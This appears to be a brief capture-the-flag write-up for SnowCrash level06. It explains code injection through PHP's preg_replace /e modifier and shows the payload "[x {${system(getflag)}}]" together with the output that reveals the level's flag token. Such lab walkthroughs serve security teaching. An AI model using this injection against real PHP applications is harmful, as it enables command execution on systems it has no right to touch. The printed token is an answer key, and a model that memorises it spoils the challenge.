@@ -1,0 +1,13 @@
+here we have a php file with
+preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+
+This regex "/(\[x (.*)\])/e", got big vulnerability.
+/e mean that the all expression in (.*) will be evaluated by a fonction
+
+So if a put this "[x {${system(getflag)}}]" on file and i send it to level06
+system(getflag) should be executed
+
+level06@SnowCrash:~$ ./level06 /tmp/script 
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
